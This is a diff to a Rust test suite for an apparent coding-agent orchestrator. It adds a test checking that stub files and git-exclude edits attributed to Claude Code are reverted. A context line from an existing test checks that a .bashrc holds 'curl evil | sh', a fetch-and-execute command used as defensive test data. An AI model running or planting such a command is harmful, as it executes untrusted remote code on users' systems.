@@ -649,3 +649,40 @@ async fn hooks_and_files_outside_the_project_are_noticed() {
     assert_eq!(fs::read_to_string(&bashrc).unwrap(), "curl evil | sh\n");
     assert_eq!(repo.changed_files().unwrap(), ["src/parser.rs"]);
 }
+
+#[tokio::test]
+async fn claude_codes_empty_stub_files_do_not_stop_the_task() {
+    let (dir, repo) = new_project();
+    let (store, mut state) = new_task(&repo);
+    let exclude = dir.path().join(".git/info/exclude");
+    let old_exclude = fs::read_to_string(&exclude).unwrap_or_default();
+    // What Claude Code does when it starts its sandbox, plus the role's work.
+    let new_exclude =
+        format!("{old_exclude}\n\n# claude-code scrub-mode stubs\n/package.json\n/.env");
+    let agent = MockAgent::new().then(
+        Role::Architect,
+        MockStep::finish_writing(
+            Verdict::Approved,
+            NextStep::To(Role::Human),
+            &[
+                (".git/info/exclude", new_exclude.as_str()),
+                ("package.json", ""),
+                (".env", ""),
+                ("docs/architecture.md", "# Architecture\n"),
+            ],
+        ),
+    );
+
+    let stop = orchestrator::run(&repo, &store, &mut state, &agent)
+        .await
+        .unwrap();
+
+    assert_eq!(stop, StopReason::WaitingForHuman(WaitReason::ApproveDesign));
+    assert!(!dir.path().join("package.json").exists());
+    assert!(!dir.path().join(".env").exists());
+    assert_eq!(
+        fs::read_to_string(&exclude).unwrap_or_default(),
+        old_exclude
+    );
+    assert!(repo.changed_files().unwrap().is_empty());
+}
